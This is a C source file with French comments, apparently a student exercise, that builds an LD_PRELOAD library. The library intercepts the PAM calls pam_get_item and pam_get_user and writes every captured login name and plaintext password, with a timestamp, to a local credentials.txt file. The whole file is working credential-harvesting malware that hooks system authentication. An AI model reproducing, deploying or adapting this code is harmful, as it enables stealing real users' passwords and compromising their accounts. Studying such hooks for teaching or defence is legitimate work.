#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <syslog.h>
#include <string.h>
#include <time.h>

// Fonction pour obtenir l'heure actuelle en tant que chaîne
const char *get_current_time() {
    static char buffer[20];
    time_t raw_time = time(NULL);
    struct tm *time_info = localtime(&raw_time);
    strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", time_info);
    return buffer;
}

// Prototype pour pam_get_item et pam_get_user
typedef int (*pam_get_item_t)(const pam_handle_t *, int, const void **);
typedef int (*pam_get_user_t)(pam_handle_t *, const char **, const char *);

// Fonction pour écrire dans le fichier credentials.txt
void write_to_file(const char *type, const char *data) {
    FILE *file = fopen("/home/kali/Partiel_C/credentials.txt", "a"); // Chemin absolu
    if (!file) {
        perror("----------------------------Erreur lors de l'ouverture de credentials.txt------------------");
        return;
    }
    fprintf(file, "[%s] %s : %s\n", get_current_time(), type, data);
    fclose(file);

    // Message de débogage
    fprintf(stderr, "--------------------------------[DEBUG] Ecriture dans credentials.txt effectuée------------------------------------\n");
}

// Intercepteur pour pam_get_item
int pam_get_item(const pam_handle_t *pamh, int item_type, const void **item) {
    static int password_logged = 0; // Variable statique pour éviter de répéter l'écriture du mot de passe
    static pam_get_item_t original_pam_get_item = NULL;

    // Charger la fonction originale
    if (!original_pam_get_item) {
        original_pam_get_item = (pam_get_item_t)dlsym(RTLD_NEXT, "pam_get_item");
        if (!original_pam_get_item) {
            syslog(LOG_ERR, "Impossible de localiser pam_get_item : %s", dlerror());
            return PAM_SYSTEM_ERR;
        }
    }

    // Appeler la fonction originale
    int retval = original_pam_get_item(pamh, item_type, item);

    // Si on capture un mot de passe (PAM_AUTHTOK) et qu'il n'a pas déjà été écrit
    if (retval == PAM_SUCCESS && item_type == PAM_AUTHTOK && item && *item && !password_logged) {
        char local_buffer[256];
        strncpy(local_buffer, (const char *)*item, sizeof(local_buffer) - 1);
        local_buffer[sizeof(local_buffer) - 1] = '\0'; // Assure une terminaison
        write_to_file("Mot de passe", local_buffer);
        password_logged = 1; // Indiquer que le mot de passe a été écrit
    }

    return retval;
}

// Intercepteur pour pam_get_user
int pam_get_user(pam_handle_t *pamh, const char **user, const char *prompt) {
    static int user_logged = 0; // Variable statique pour éviter de répéter l'écriture du login
    static pam_get_user_t original_pam_get_user = NULL;

    // Charger la fonction originale
    if (!original_pam_get_user) {
        original_pam_get_user = (pam_get_user_t)dlsym(RTLD_NEXT, "pam_get_user");
        if (!original_pam_get_user) {
            syslog(LOG_ERR, "Impossible de localiser pam_get_user : %s", dlerror());
            return PAM_SYSTEM_ERR;
        }
    }

    // Appeler la fonction originale
    int retval = original_pam_get_user(pamh, user, prompt);

    // Si le login est récupéré avec succès et qu'il n'a pas déjà été écrit
    if (retval == PAM_SUCCESS && *user && !user_logged) {
        write_to_file("Login", *user);
        user_logged = 1; // Indiquer que le login a été écrit
    }

    return retval;
}

